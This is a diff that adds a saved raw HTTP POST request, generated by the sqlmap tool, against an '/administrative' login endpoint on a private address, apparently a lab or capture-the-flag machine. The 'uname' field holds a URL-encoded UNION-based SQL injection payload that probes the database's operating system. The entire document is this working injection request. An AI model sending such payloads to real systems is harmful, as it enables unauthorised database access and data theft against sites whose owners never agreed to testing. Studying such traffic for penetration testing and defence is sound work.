@@ -1,0 +1,12 @@
+POST /administrative HTTP/1.1
+Content-Length: 241
+Cache-Control: no-cache
+User-Agent: sqlmap/1.5.7#stable (http://sqlmap.org)
+Referer: http://10.10.11.101:80/administrative
+Host: 10.10.11.101
+Accept: */*
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Connection: close
+
+uname=%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7170627171%2C%28CASE%20WHEN%20%280x57%3DUPPER%28MID%28%40%40version_compile_os%2C1%2C1%29%29%29%20THEN%201%20ELSE%200%20END%29%2C0x71706a6b71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=
